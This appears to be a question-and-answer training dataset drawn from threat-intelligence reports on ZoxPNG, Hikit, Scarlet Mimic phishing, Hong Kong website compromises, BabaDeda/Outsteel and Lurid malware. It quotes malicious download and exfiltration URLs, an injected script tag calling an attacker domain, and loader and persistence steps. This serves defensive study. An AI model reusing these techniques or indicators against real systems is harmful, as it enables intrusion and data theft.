    "instruction": "Big Headline: Commands\nZoxPNG uses a notion of function registration to assign command handlers to specific, sequential IDs. The order in which the handlers are registered dictates the ID of the command. The ID values start at 0x80061001 and increment for each subsequent handler that is registered. The following ID to function mappings have been observed:\nEach command has a command-specific data format for arguments and responses. Not all commands require arguments or provide responses. The following sub-sections break down not only the format of the data flowing into and out of each command but also provide an overview of what each command does and how it operates.\nMedium Headline: Command 0x80061001: Initiate Remote Shell\nThe Initiate Remote Shell command takes a single argument which contains the full filename and path to the command interpreter (e.g. cmd.exe) to use for the remote shell. Once activated, the command handler terminates any existing remote shell processes and closes any open pipes going to the remote shell process. The handler then creates new pipes before generating a new remote shell process and using the newly created pipes for the STDIN, STDOUT and STDERR of the console process. If the CreateProcess call returns an error, the command handler will generate a response with the following fields within the CommandData set:\nIf CreateProcess is successful, the command handler calls the command handler for Remote Shell Interaction (0x80061002) and pass the original CommandData to the command handler with the dwCommandID field changed to 0x80061002 and the dwPayloadSize set to 0 in order to get the initial response from the remote shell to the C2 server. Typically this initial response will be the banner and command prompt from a newly executed cmd.exe. The command handler will return the response from the Remote Shell Interaction handler as its own.\nMedium Headline: Command 0x80061002: Remote Shell Interaction\nThe Remote Shell Interaction command is responsible for both polling for waiting remote shell output as well as providing input to the remote shell. When activated, the Remote Shell Interaction command handler determines if the pipe for the STDIN is still valid (non-NULL). If the pipe is invalid, the command handler will generate a response with the following fields within the CommandData set:\nIf the pipe handle is still valid, and the CommandData's dwPayloadSize value is non-zero, the payload data that follows the CommandData structure is passed to the remote shell via the pipe without translation by means of a call to WriteFile.\nAfter a 500ms sleep, a new buffer of 65564 bytes is allocated by the command handler in order to hold any response data. A call to PeekPipe is made to determine if there is any output from the remote shell waiting. If PeekPipe indicates the presence of waiting data, a call to ReadFile is made to copy up to 65536 bytes of the output into the payload portion of the response buffer. The command handler returns the response with the CommandHeader set to the size of the entire data blob and the following fields set within the CommandData structure:\nMedium Headline: Command 0x80061003: Download File\nThe Download File command, as the name implies, is responsible for transferring a file from the C2 server to the victim's machine. The payload of the data blob contains a data structure defining the filename (and destination) of the file being transferred, the number of bytes within the payload to write to the victim's machine and the offset (if any) to start writing the payload data. The format of the command's argument structure is as follows:\nIf the dwDataOffset field is non-zero, then the disposition for the CreateFile call is set to OPEN_EXISTING whereas if the field is zero, then a new file is created by using CREATE_ALWAYS. If the CreateFile call is successful, the command handler calls SetFilePointer to the value specified by dwDataOffset and then calls WriteFile in order to write the dwBytesToWrite number of bytes to disk.\nThe command handler returns a CommandHeader structure with the dwCommandID field of the CommandData structure set to 0x80061003 to the command dispatch. If the CreateFile call is successful then the dwLastError field is set to 0 otherwise the field is set to the value returned by GetLastError.\nMedium Headline: Command 0x80061004: Upload File\nThe Upload File command copies the contents of a file on the victim's machine to the C2 server. The payload of the data blob contains a data structure (identical to the data structure for the Download File command) defining the full filename and path of the file being transferred, the number of bytes to read from the file and the offset (if any) to start reading from within the file. The format of the command's argument structure is as follows:\nThe command handler begins by calling CreateFile with the disposition set to OPEN_EXISTING. If the CreateFile call is unsuccessful, the command handler returns a CommandHeader structure with the dwCommandID field of the CommandData structure set to 0x80061004 and the dwLastError field is set to the value returned by GetLastError.\nIf the dwBytesToRead is -1, the command handler will calculate the number of bytes to read from the file by taking the total file size (as reported by GetFileSize) and subtracting the value of the dwDataOffset field. The command handler will allocate a response buffer with enough space to read in the specified number of bytes of the file along with a response header\nconsisting of a CommandHeader along with a 12 byte payload header. The format of the response buffer, following the CommandHeader, is as follows:\nAfter moving the file pointer by calling SetFilePointer and supplying the value of the dwDataOffset field, the command handler will read the file (up to the number of calculated bytes to read) into the (data) section of the response buffer by calling ReadFile. Regardless of the success of the file read, the command handler sets the dwFileSize, dwReadOffset and dwBytesRead fields appropriately and returns the response buffer to the command dispatch.\nMedium Headline: Command 0x80061005: Get Drive Information\nThe Get Drive Information command provides a list of each letter assigned drive on the victim's machine along with some limited information concerning each drive. The command handler requires no arguments. When activated, the command handler will call the GetLogicalDriveStrings function in order to obtain a list of assigned drive letters. After allocating a response buffer large enough to contain a CommandHeader and the necessarily information structures to describe each drive, the command handler begins filling out a DriveInfo data structure for each drive and placing the structure within the payload of the response buffer. The DriveInfo structure is defined as:\nstruct DriveInfo\n{\nDWORD dwDriveNumber; char szDriveLetter[4];\nDWORD dwDriveType;\nULARGE_INTEGER qwTotalBytes;\nULARGE_INTEGER dwTotalFreeBytes;\n};\nThe dwDriveType field contains the value returned from a call to GetDriveType while qwTotalBytes and qwTotalFreeBytes come from a call to GetDiskFreeSpaceEx.\nAfter completing the array of DriveInfo structures for each assigned drive letter, the command handler will set the dwCommandID field within the CommandData structure to 0x80061005 and return the response buffer. If, however, the call to GetLocalDriveStrings returns an error, the command handler will return only a CommandHeader structure with the dwCommandID field set to 0x80061005 and the dwLastError set to the return value from GetLastError.\nMedium Headline: Command 0x80061006: Create Directory\nThe Create Directory command creates a directory on the victim's machine. The command handler uses the payload section of the data blob (the section following the CommandHeader and CommandData structures) as a NULL-terminating string containing the full path of the directory to create. The command handler uses the CreateDirectory function to create the directory on the victim's machine. The command handler then returns a CommandHeader with the dwCommandID set to 0x80061006, the dwPayloadSize set to 0 and, if the CreateDirectory function was successful, the dwLastError set to 0 otherwise the field is set to the value returned from GetLastError.\n\nQ: How does ZoxPNG handle the creation and management of remote shell sessions? Describe the process and the role of command handlers in this context.",
    "output": "A: ZoxPNG uses the 'Initiate Remote Shell' command (0x80061001) to manage remote shell sessions. This command takes a single argument specifying the full filename and path to the command interpreter (e.g., cmd.exe). Upon activation, the command handler terminates any existing remote shell processes and closes open pipes. It then creates new pipes and generates a new remote shell process, using these pipes for STDIN, STDOUT, and STDERR. If the CreateProcess call is successful, the command handler calls the 'Remote Shell Interaction' command (0x80061002) to get the initial response from the remote shell to the C2 server. If CreateProcess fails, the command handler generates a response with error details.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Evolution\nThe earliest known Hikit sample dates back to 31 March 2011. Known as the Gen 1.0 sub-generation of Hikit Gen 1, the first known sample of Hikit deviated from the later traditional Gen 1 model. The Gen 1.0 sample was a standalone executable whereas subsequent Gen 1 sub-generations use a DLL running as a service. The Gen 1.0 sample is clearly a work-in-progress. The Gen 1.0 sample, while different than subsequent sub-generations, does still rely on the Driver component and for the most part the structure of the code does not differ much going forward into the Gen 1 evolution.\nLess than three weeks after Gen 1.0, the author(s) of Hikit move into Gen 1.1. The notable change is that the Hikit model of using a DLL and driver, which has remained until present day, comes into being. The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change. Both Gen 1.0 and Gen 1.1 use plaintext data transmissions.\nDevelopment appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011 based on a lack of available samples found. During this time the development of Hikit appears to change locations. Gen 1 samples have Program Database (PDB) file strings that identify the file path of the Hikit source code. For Gen 1.0 and Gen 1.1 samples, the file path of the Hikit source code is consistently h:\\JmVodServer\\hikit. Starting with Gen 1.2, the file path switches to e:\\SourceCode\\hikit_new. It is at this time that the functionality of Hikit Gen 1 begins to mature.\nIn Gen 1.2, the communication between the infected machine and the attacker is encrypted using an XOR mask. A more subtle change is the renaming of the \"socks5\" command to simply \"proxy\" within the code. The code within Hikit begins to mature but the overall functionality does not expand beyond the original set of commands found in Gen 1.0. The other remarkable change within the Gen 1.1 to Gen 1.2 development is the way in which the session handshake trigger operates. In Gen 1.0 and Gen 1.1, the DLL instructs the Driver to listen for a specific string (typically a HTTP request string) and responds with another string. In Gen 1.2, the Driver has a hardcoded trigger string (a specific HTTP request string) and the DLL instructs the Driver to inspect a specific HTTP header field for a specific hexadecimal value. This moves Gen 1.2 into more of a username/password authentication scheme whereas previous sub-generations could potentially be accessed by accidental HTTP requests. At the same time, the Driver responds with a specific value with in the Etag HTTP header field. This places Gen 1.2 into a more stealth position as a random, non-HTTP compliant response from Gen 1.0 and Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag header.\nGen 1.2's development cycle appears to exist between 23 October 2011 and 2 November 2011 with several new samples being found on the Internet having legitimate compile times during this time window. There is, however, evidence that the development of Hikit Gen 1 and Gen 2 overlap by several months. The earliest Gen 2 sample known to exist dates to 28 August 2011, two months before the first known Gen 1.2 sample. The last known Gen 1.2 sample, and by extension, the last known Gen 1 sample, dates to 9 April 2012.\nThe first known Gen 2 sub-generation, Gen 2.0 Alpha, much like Gen 1.0, represents an early development version of the Gen 2 Hikit sub-family. Gen 2.0 Alpha is a stand-alone Windows console executable that can run as a service executable. Gen 2.0 Alpha supports the same commands as Gen 1.2 with an additional command that returns the infection's configuration information.\nOn 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer(s) of Hikit. Also a stand-alone console executable like Gen 2.0 Alpha, the Gen 2.0 Beta code changes internally without providing significant functionality improvements with the exception of now the executable uses a device driver to hide network, file, and registry artifacts related to its operation. Both Gen 2.0 Alpha and Gen 2.0 Beta still retain PDB file path information within their binaries. During the development phase of Gen 2.0 Alpha, development of the Gen 2.0 Alpha variants changes locations. First version of the Gen 2.0 Alpha malware, from 28 August 2011, has the PDB path located in H:\\JmVodServer\\Matrix_new2 whereas the file path for later Gen 2.0 Alpha and Gen 2.0 Beta binaries has the PDB path in E:\\SourceCode\\Matrix_new which suggests that the source code for both Gen 1 and Gen 2 existed on the same machine and moved at roughly the same time. This may indicate either a single developer or a team (or set of teams) with shared resources.\nThe first known Gen 2.1 binary has a compile date of 17 April 2012. Gen 2.1 represents the first Gen 2 sub-generation to use an executable-based loader, DLL and driver model, a model that all subsequent Gen 2 sub-generations employ. The functionality of the Gen 2.1 sub-generation is the same as the\nprevious generations with no new commands being introduced. Gen 2.1 is the first sub-generation in the Gen 2 sub-family to introduce 64-bit binaries.\nThe Gen 2.2 sub-generation appears to have begun on 20 July 2012. Gen 2.2 is notable for altering where the configuration information of the RAT is stored and using both DLL-based and executable-based loaders. Also notable is the fact that the sub-generation spans a significant amount of time with intermittent periods of development. The bulk of the Gen 2.2 samples that have the tell-tale marks of being the product of a builder have a compile date of 26 July 2013, a full year after the first known Gen 2.2 sample. Between 21 July 2012 and 20 February 2013, there are no known Gen 2.2 binaries. The two 20 July 2012 samples have different compile times indicating they were not the product of a builder but rather unique compilations. Between 21 February 2013 and 27 February 2013, there are 4 unique compilation dates for the DLL component with 7 unique, known Gen 2.2 DLLs. The bulk of Gen 2.2 samples have a compile date of 26 July 2013. There are approximately 25 known Gen 2.2 DLLs with the 26 July 2013 compile date. The Gen 2.2 sub-generation appears to exist through at least 19 September 2013.\nThe last known Gen 2 sub-generation, Gen 2.3, began on 12 December 2013. Gen 2.3 is notable for its use of a legitimate SSL certificate as part of the handshake between the infected machine and the attacker's C2. The DLL will send a legitimate SSL certificate as a means to disrupt heuristic IDS sensors that look for encrypted traffic. Another interesting aspect of the Gen 2.3 sub-generation is that there is no longer a marker to designate the beginning of the embedded configuration. Gen 2.1 and Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in order to allow the builder to locate the configuration space when constructing a new configuration for the binaries. Gen 2.3, however, uses a specific location instead, requiring the builder to calculate the specific location using the PE/COFF header of the binary. Also, while Gen 2.1 and Gen 2.2 retain the configuration within the DLL component, Gen 2.3 stores the configuration within the loader component. This allows the attackers to configure the loader without having to update the DLL.\nThe evolution of Hikit is a long and drawn out series of small, incremental development changes. The important take away from the evolution of Hikit is that the developers for Gen 1 appear to have changed in late 2011 and development of Gen 2 has a several month overlap with the development and usage of Gen 1. The following table provides a quick reference to the generational (and sub-generational) designations of Hikit.\nTimeline Outlined in Appendix A: HiKit Versions\n\nQuestion: What were the key differences between the initial Gen 2.0 Alpha and Gen 2.0 Beta versions of Hikit, and how did these changes impact the malware's functionality and detection?\n\nAnswer:",
    "output": "Gen 2.0 Alpha was a stand-alone Windows console executable that supported the same commands as Gen 1.2 with an additional command returning the infection's configuration information. Gen 2.0 Beta, also a stand-alone console executable, introduced the use of a device driver to hide network, file, and registry artifacts related to its operation. This change significantly improved the malware's ability to evade detection by hiding its activities on the victim's system. Both versions retained PDB file path information, indicating shared development resources and potential overlap in development timelines with Gen 1.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Phishing Campaign\nUsing the example of an e\u00admail sent to Tibetan journalists, we can demonstrate how a typical phishing attack in the campaign works. The e\u00admail masquerades as sent by a Tibetan activist, describes a video on China and Tibet, and shares a link to what appears to be a video sharing site.\nFrom: Dorjee Tenzin <tenzinsft@gmail.com>\nDate: 22 Nov 2015\nSubject: How CHINA takes care of Tibet and Tibetans \u2013 video\nTo: [Redacted]\nThis video \u2013 How CHINA takes care of Tibet and Tibetans \u2013 is short and easy to understand. Must watch.\nhttp://www.downvids.net/how\u00adchina\u00adtakes\u00adcare\u00adof\u00adtibet\u00adand\u00adtibetans\u00ad595657.html\nIn fact, the link directs the user to a phishing page:\nhttp://accountgoogle[.]firewall\u2010gateway[.]com/serviclogin\nThe site displays a lookalike to the Google Gmail login page (see Figure 2).\nInterestingly, the login page used by the attackers is slightly outdated. Their version includes both username and password prompts on the same page. Google has been using a two\u00adprompt process for authentication since\nIf a victim enters their credentials, the data is sent to the attackers via an HTTP POST request that is formatted as: http://accountgoogle.firewall\u2010gateway.com/serviclogin/ojkiojr09[.]asp. An example of the data that is sent back to attackers is provided in Figure 3.\nMedium Headline: Decoy Content\nOnce a user enters their credentials they are redirected to decoy content. In the example attack against Tibetan journalists, if the victim entered their credentials they were re\u00addirected to the video \"How CHINA takes care of Tibet and Tibetans\" on the video sharing site referenced in the email (see Figure 4).\nThe destination content that the user is sent to is determined by a string in the subdirectory of the URL that has various misspellings of \"servicelogin\". In the emails we collected, we found three subdirectory variations:\nhttp://filegoogle[.]firewall\u2010gateway[.]com/servicelogin http://accountgoogle[.]firewall\u2010gateway[.]com/serviclogin http://accountgoogle[.]firewall\u2010gateway[.]com/servicclogin We speculate that the last part of the URL, \"ojkiojr09\" in our example URL (http://accountgoogle.firewall\u2010gateway.com/serviclogin/ojkiojr09[.]asp) may be a campaign code, or a way for the attackers to differentiate on their end who is accessing the phished page, and the destination content to which they should be forwarded. We see a similar string in another of the emails that may be used for this purpose: http://filegoogle[.]firewall\u2010gateway[.]com/servicelogin/sfwef[.]asp\nMedium Headline: Phishing Campaign Timeline\nWe have observed the campaign active between at least November 9, 2015 to December 18, 2015. During this period we collected three phishing emails sent to Tibetan journalists and NGOs. Monitoring the URLs that link to the phishing page reveals that the destination content to which the user would be forwarded was changed frequently. These changes suggest that the campaign was\nactive beyond the three emails we collected and the attackers were sending out additional emails with messages linked to the new destination content.\nFigure 5 provides a timeline for the campaign and shows when emails were received, the original destination content provided, and changes to the destination content over time. On December 18 the servers were up, but no content was being served in reply to logins.\nWhile we only collected three emails during the span of the campaign, changes in the destination content suggest the timing and theme of further phishing attacks. On November 25, 2015 the destination content on URLs 1 and 2 were both changed to climate change\u00adrelated content.\nThe content redirected from URL 1 was changed to a public Google Drive folder that contained campaign materials on climate change from a Tibetan NGO. The content redirected from URL 2 was changed to a website used to organize the Global Climate March (globalclimatemarch.org), a demonstration to raise climate change awareness.\nThe climate change theme is significant. During this period Tibetan organizations were taking part in (<http://www.cop21.gouv.fr/en/>)advocacy to raise awareness on climate change in Tibetan areas in anticipation of the held in Paris, France from November 30 to December 12, 2015.\nSee Appendix A for details on each attack and destination content change.\nQuestion: How did the Scarlet Mimic phishing campaign adapt its tactics to exploit the interests and behaviors of Tibetan journalists and activists?",
    "output": "Answer: The Scarlet Mimic phishing campaign adapted its tactics by sending emails that masqueraded as coming from Tibetan activists, with subject lines and content designed to pique the interest of Tibetan journalists and activists. For instance, one email described a video titled 'How CHINA takes care of Tibet and Tibetans' and included a link that appeared to lead to a video sharing site. This link actually directed users to a phishing page designed to steal Google credentials. The phishing page was a lookalike of the Google Gmail login page, albeit slightly outdated, displaying both username and password prompts on the same page. Once victims entered their credentials, they were redirected to decoy content, such as the actual video mentioned in the email. This tactic leveraged the targets' interest in Tibetan issues and their trust in seemingly legitimate content.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Democracy in Hong Kong Under Attack\nPosted on , 2014 by\nOver the last few months, Volexity has been tracking a particularly remarkable advanced persistent threat (APT) operation involving strategic web compromises of websites in Hong Kong and Japan. In both countries, the compromised websites have been particularly notable for their relevance to current events and the high profile nature of the organizations involved. In particular the Hong Kong compromises appear to come on the heels of the (<https://en.wikipedia.org/wiki/Occupy_Central_with_Love_and_Peace>)py Central Campaig shifting into high gear. These compromises were discovered following the identification of malicious JavaScript that had been added to legitimate code on the impacted websites. This code meant that visitors were potentially subjected to exploit and malicious Java Applets designed to install malware on their systems. While investigating these cases, Volexity also discovered additional APT attack campaigns involving multiple other pro-democratic websites in Hong Kong. These attempts at exploitation, compromise, and digital surveillance are detailed throughout this post.\nCompromised Pro-Democratic Hong Kong Websites\nWarning: Many of these websites may still be compromised and present a risk to visitors. Browse with caution.\nAlliance for True Democracy \u00e2\u20ac\" Hong Kong\nOver the last two days, Volexity has observed malicious code being served up from the website of the Alliance for True Democracy (ATD) in Hong Kong (www.atd.hk). ATD is an alliance of people and organizations dedicated to democracy and universal suffrage in Hong Kong. At the time of this writing malicious code is still live on the website, so please visit with care until the website is clean. Below is a screen shot of the malicious code references found pre-pended to a JavaScript file on the website named superfish.js.\nThis JavaScript file is called from other parts of the website and effectively nests the loading of additional JavaScript written and interpeted as:\n<script language=javascript src=http://java-se.com/o.js</script>\nThe domain name java-se.com is known bad and associated with APT activity. At the time of this post, the domain is hosted on the Japanese IP address 210.253.101.105.\n7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC.\nVolexity has yet to actually see the contents of the file o.js, as the websites has continuously returned HTTP 403 responses each time it was requested. The file was requested from IP addresses throughout Asia without ever returning valid content. It's unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets. This same code has also been observed being served from another Hong Kong website described in the next section.\nWebshell Backdoor\nWhile examining the ATD website, Volexity also observed that the site had a password protected backdoor webshell placed on it. This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises. Volexity refers to this shell as the Angel Webshell, named after its default password of \"angel\u00e2\u20ac\u200b. The shell will simply display the text \"Password:\u00e2\u20ac\u200b, a text input box, and a Login button. A screen shot of the webshell as observed on the ATD website can\nbe seen below.\nDespite the shell being written in PHP and only displaying a simple Login prompt, it is easy to identify the Angel webshell based on unique components of its viewable HTML source code. The HTML source of this page is displayed in the following image.\nWhile Volexity operates under the assumption attackers have placed webshells on webservers they have compromised, in this particular instance it can be seen with certainty. Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems.\nRead the text above and answer this question: Why did Volexity consider the APT operation involving strategic web compromises in Hong Kong and Japan particularly remarkable? What specific tactics were employed by the attackers to compromise these websites, and how did these tactics relate to current events in the region?",
    "output": "Volexity considered the APT operation remarkable due to the strategic nature of the compromised websites in Hong Kong and Japan, which were highly relevant to current events and involved high-profile organizations. The compromises in Hong Kong coincided with the Occupy Central Campaign gaining momentum. The attackers employed malicious JavaScript code added to legitimate code on the impacted websites, which could subject visitors to exploits and malicious Java Applets designed to install malware on their systems. This tactic allowed the attackers to potentially exploit, compromise, and digitally surveil visitors to these pro-democratic websites.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.1 Double BabaDeda crypter downloaded from LNK or docm template\nThis infection chain, which can be placed in the period September / October 2021 according to the compilation times, starts with a link (LNK) or a WORD template document that downloads the BabaDeda crypter. The BabaDeda crypter includes Outsteel as a payload and a downloader as 2nd library.\nexecution process graph\nThe lnk file with hash 931a86f402fee99ae1358bb0b76d055b2d04518f, most likely distributed by e-mail, named \"\u041e\u0441\u043e\u0431\u043b\u0438\u0432\u0456 \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0438 \u0421\u0411\u0423.lnk\" (Special documents of the SBU.lnk) is, clearly, a decoy document for Ukrainian defense officers. This lnk file was contained in zip archives hosted on discord.\nWhen open it executes a PowerShell command to download and execute the first phase from the URL: \"hxxp: //3237.site/test01.exe\"\nThe downloaded executable with hash 0d584d72fe321332df0b0a17720191ad96737f47 is stored in the public directory and it is executed from the PowerShell self.\nInstead the document with hash ac672a07c62d48c0a7f98554038913770efaef11 is a word dotm model and starts the first phase of the infection in the same way as the lnk file, downloading and executing the same artifact through PowerShell: hxxp://3237.site/test01.exe.\nThe following document header suggests that this document may have been used after September 2021.\n\"Addition to the decision of the National Security and Defense Council of Ukraine of September 7, 2021 \"On Amendments to Personal Special Economic and Other Restrictive Measures (Sanctions)\"\nThe template contains a macro that on the open event drops a cmd file with a PowerShell command inside.\nThe cmd file is stored in \"C:\\Users\\Public\\Documents\\programtwo.cmd\" and contains the PowerShell command to download the artifact from URL \"hxxp: //3237.site/test01.exe\" and save it in \"C:\\Users\\Public\\Documents\\manlevel.exe\".\nAs in the previous LNK document the PowerShell command runs the downloaded file. Also, the WORD template has been hosted on discord and is most likely downloaded as a remote template from a docx released by email.\nSmall Headline: 2.1.1 First Stage\nBoth files, lnk and WORD template, downloads the same installer has been created with Inno Setup.\nOnce executed, it extracts all the components in the path:\n\"C:\\Users\\admin\\AppData\\Roaming\\mXParser\".\nThe main executable, named \"mathparser.exe\" whose hash is 26474ba449682e82ca38fef32836dcb23ee24012, is executed directly by the installer after all the components have been extracted.\nThis installation is a BabaDeda crypter, i.e. a type of loader. In fact, as described in the blog of the security company \"Morphisec\", it is used to evasively load a malicious payload stored in another file. Since the analysis cited by the blog is exhaustive, it was not performed.\nThis loader was reported in November 2021 in connection with attacks against the NFT and Crypto community. Instead, it was used in these campaigns, leading to the\nassumption that it could be code reuse or the action of the same cybercriminal group in favour of a state-sponsored threat actor.\nBasically, the BabaDeda crypter phases are:\n1. Main Binary load and run a malicious DLL;\n2. The malicious DLL load and execute in another thread the second malicious DLL;\n3. The first malicious DLL read and parse the shellcode and write it in the text section of the main binary;\n4. The first malicious DLL returns to the shellcode entry point;\n5. The decryption shellcode has three main tasks: first, it extracts the loader shellcode and the payload, then it decrypts them, and finally, it transfers the execution to the decrypted loader shellcode.\n6. Finally, the payload is executed.\nSince the second loaded DLL and the final payload can be customised, BabaDeda crypter can be used to load any type of installation, in fact in this particular infection chain the first installer is intended to download and run another BabaDeda crypter. This differs from the analysis carried out by the company Morphisec in November 2021 in which the samples analysed were only used to directly upload malicious artefacts.\nThe \"mathparser\" installation directory contains the following malicious files:\nSo, the main binary before loading the library named \"JxCnv40.dll\" set the current directory to the right path to be sure that side loading technique works.\nThis library, whit hash 7d44391b76368b8331c4f468f8ddbaf6ee5a6793, run in a thread the second malicious library.\nBasically, the first library open \"manual.pdf\" reads all the content, then starts a new thread and after copy the 0x226 bytes from the file content into the main binary text section. The main binary is compiled with text section writable, so it does not need any virtual protect API. The shellcode taken from the file is located at a specified offset and it has a fixed size, this means that the BabaDeda crypter is not so ductile, indeed the binary is strictly linked to the shellcode and the file that contains the shellcode. This makes harder to re-use it without having the BabaDeda crypter build tools. A threat actor could use it changing the offsets manually to load another shellcode of different length from another file.\nBelow the routine that loads the second library:\nMeanwhile the second library is executed in another thread, the final payload is decrypted and executed in the main binary thread. The payload named Outsteel sends the documents to be exfiltrated to the URL \"hxxp://185.244.41.109:8080/upld/\".\nThis IP was disclosed as an IoC by the Ukrainian CERT in February 2022, although the same has been in use since at least October 2021. The final payload was decompiled with AutoIt tools and a code snippet follows.\nThe second library, with hash e1d92e085df142d703ed9fd9c65ed92562a759fa, is a mere downloader. Its main and only purpose is to download the next stage and run it.\nThen the library with hash e1d92e085df142d703ed9fd9c65ed92562a759fa downloads from the URL \"hxxp://smm2021.net/load2022.exe\" the artefact, stores it in the path \"C:\\Users\\<user>\\Downloads\\installation.exe\" and finally executes it.\nThe downloaded file represents the second BabaDeda crypter installation and has hash: 75afd05e721553211ce2b6d6760b3e6426378469.\nIn particular, once executed, it runs an msiexec command to extract each component of the installation to \"C:\\Users\\admin\\AppData\\Roaming\\AdoptOpenJDK\\Network OpenJDK 11 2.1.11.53\". After that, the main binary is executed automatically.\nThe malicious files released are:\nThe workflow is quite like the previous, the difference is in the final payload and in the second malicious library.\nThe library \"ff_wmv9.dll\", with hash ba9cea9ae60f473d7990c4fb6247c11c080788d3, is executed to decrypt the final payload and loads the second library.\nIt opens the library \"usage.pdf\" reads the content, create a new thread and it copies in text segment the shellcode located at a specific offset and run it.\nThe second library is loaded and executed.\nThe second library achieves the persistence creating a link file pointing to the main binary in the start-up directory. The link file is created via COM object interface, in particular using the IShellLinkW interface.\nThe start-up directory is obtained using SHGetFolderPathW() API.\nMeanwhile the second library gains the persistence, the main thread run the real payload after that it is decrypted as described for BabaDeda crypter. To have the final payload the main binary has been dumped just after the decryption phase. The final payload is a downloader that tries to download the next stage and run it in another process.\nThreat actor used a particular way to check the file size. It run a stat() and checked the size field. If it is 1 then the file and the malware is removed otherwise it is executed. The downloaded file is executed in a new process.\nOn the other hand, below the function to delete itself.\nUnfortunately, the C2 \"hxxp://45.12.5.62/<timestamp in hex>\" was not working so no further payloads are available.\nSmall Headline: 2.1.2 WhisperGate Code OVERLAP\nSome similarity has been found between the final payload, especially in the self-deletion routine. In particular the similarity is with the file having the hash 34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907, i.e. the file \"Wiper\".\nIndeed the file wiper reported by \"Unit42\" in shows that the self-deletion command string is almost identical.\nBelow the two strings used:\nIn the following snippet the difference between the two functions.\nadfrecorder.exe (final payload)\nAlso the routine to run the command is very similar.\nadfrecorder.exe (final payload)\nAlthough the code is quite similar, at the same time it can be quite common. Nevertheless, the CMD command, its options and the use of the IP 111.111.111 as a whole suggest a similarity between the two artefacts. In addition, both malware processes close after execution of the CMD command.\n\nHow does the BabaDeda crypter operate within the infection chain described in the report? Explain the steps involved in its execution process.",
    "output": "A: The BabaDeda crypter operates through a series of steps to evasively load a malicious payload. Here are the steps involved: 1. The main binary loads and runs a malicious DLL. 2. The malicious DLL loads and executes a second malicious DLL in another thread. 3. The first malicious DLL reads and parses the shellcode, writing it into the text section of the main binary. 4. The first malicious DLL returns to the shellcode entry point. 5. The decryption shellcode extracts, decrypts, and transfers execution to the decrypted loader shellcode. 6. Finally, the payload is executed. This process allows the BabaDeda crypter to load any type of installation, including another instance of the BabaDeda crypter.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ABSTRACT\nThis report investigates a campaign of targeted malware attacks that has successfully compromised 1465 computers in 61 different countries. Based on the project path embedded in the malware, we have named this specific campaign \"Lurid Downloader\" although the malware is typically known as \"Enfal\". The majority of the victims are located in Russia and other members of the Commonwealth of Independent States (CIS). We were able to identify 47 victims that include numerous government ministries and diplomatic missions along with space-related government agencies, companies and research institutions in Russia and other members of the CIS along with a smaller amount of similar entities in Europe.\nThe threat actors behind \"Lurid Downloader\" launched 301 malware campaigns targeting entities in specific countries or geographic regions and tracked the success of each campaign by embedding a unique identifier in each instance of malware and associating it with specific victims. While some campaigns resulted in numerous victims, others were very specific and targeted resulting in only one or two victims. While previous Enfal activity has been typically associated with threat actors in China, it remains unclear who is behind the Lurid Downloader attacks.\nBig Headline: ATTACK VECTOR\nIn a typical targeted malware attack, a target typically receives a socially engineered message \u2013 such as an email or instant message \u2013 that encourages the target to click on a link or open a file. The links and files sent by the attacker contain malicious code that exploits vulnerabilities in popular software such as Adobe Reader (e.g. pdf's) and Microsoft Office (e.g. doc's). The payload of these exploits is malware that is silently executed on the target's computer. This allows the attackers to take control of the computer and obtain data from it. The attackers may then move laterally throughout the target's network and are often able to maintain control over compromised computers for extended periods of time. Ultimately, the attacks locate and ex-filtrate sensitive information from the victim's network.\nIn this case, the delivery mechanism used was an email with a malicious PDF as an attachment. The email had no content, just a subject line and an attachment. The email message was spoofed to appear to be from ohhdl@dalailama.com, the Office of the Dalai Lama and had a subject of \"Tibetan Losar Event on 6 March 2011\". It also contained an attachment named \"LOSAR FLYER_edited-3.pdf\".\nThe email was sent using an email provider called Gawab (gawab.com) which is popular in the Middle East. The server used was info3.gawab.com (66.220.20.18) and the email address was emb107@gawab.com. The originating IP address was: 96.46.11.88 (INTERNETXTUSA). While this IP address is assigned to the US, it is used by a VPN provider in China7.\nIf the attached PDF is opened with older versions of Adobe reader, malicious code is executed that drop malware on the target's system. The malware then connects to a command and control server under the attacker's control. At this time, the target's computer is compromised and under the full control of the attackers.\n7 http://www.ldvpn.cn/us-dongtai.html\nBig Headline: MALWARE\nThis PDF contains a JavaScript stream that exploits the util.printd vulnerability (CVE-2009-4324) that affects Adobe Reader 9.x (before 9.3) and 8.x (before 8.2).\nThis PDF contains a JavaScript stream that exploits the util.printd vulnerability (CVE-2009-4324) that affects Adobe Reader 9.x (before 9.3) and 8.x (before 8.2).\nAfter successful exploitation, two malware components are created. One is a dropper (ctfmon.exe) that installs a windows service. The service loads the dropped dll file mspmsnsr.dll<long string of characters>. The malicious Windows service stores its configuration settings in the registry:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\WmdmPmSp\\Parameters\nThis malware identifies itself as version 2.14. During the course of our investigation, we discovered another version of the malware that identifies itself as version 2.15.\nInstead of a Windows service, version 2.15 is just a single executable that copies itself to the system folder and ensures persistence by changing the common start folder of windows to a special one it creates. It then copies all the usual auto-start items there, as well as itself. The existence of this folder is constantly checked and redone if the user or any program switches it back to normal.\nThe Trojan collects information from the computer and sends it via HTTP POST. The information it collects is the following:\n\u2022 Computer name\n\u2022 MAC address\n\u2022 computer OS and version\n\u2022 IP address and codepage\n\u2022 language of the operating system.\nIt constantly communicates with a C&C server to perform certain info-stealing 